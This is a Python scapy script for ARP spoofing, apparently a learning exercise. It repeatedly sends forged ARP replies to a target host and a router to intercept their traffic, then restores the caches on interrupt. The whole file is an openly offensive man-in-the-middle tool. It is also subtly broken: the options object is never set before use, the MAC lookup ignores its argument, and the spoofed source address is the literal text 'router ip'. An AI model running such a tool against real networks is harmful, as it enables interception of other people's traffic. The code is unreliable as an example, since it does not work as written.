#!/usr/bin/env python
import time
import scapy.all as scapy
import sys
import argparse
# to know the fields scapy.ls(scapy.ARP)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="Target_IP", help="Target IP / IP to spoof")
    parser.add_argument("-r", "--router", dest='Router_IP', help="Router IP / Router to spoof")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=options.target_IP)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff' )
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] 
   
    return answered_list[0][1].hwsrc

def spoof(target_IP, spoof_IP):
    target_MAC = get_mac(target_IP)
    packet = scapy.ARP(op = 2, pdst = target_IP, hwdst = target_MAC, psrc = "router ip" )      # op = 2 to set the packet as an ARP response not a ARP Request
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source)    # no hwsrc will set the MAC to mine by default
    scapy.send(packet, count = 4, verbose = False)



sent_packet_count = 0

try:
    while True:
        spoof(options.Target_IP, options.Router_IP)
        spoof(options.Router_IP, options.Target_IP)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packet send : " + str(sent_packet_count), end="")          # \r override print statement on a new line (Python 2.7)
        time.sleep(2)                                                           # don't store in a buffer show right away ||||| #sys.stdout.flush() Python 2.7 
except KeyboardInterrupt:
    print("[-] CTRL + C Detected ..... Cleaning logs, restoring IP Table to default values")
    restore(options.Target_IP, options.Router_IP)
    restore(options.Router_IP, options.Target_IP)

    options.get_arguments()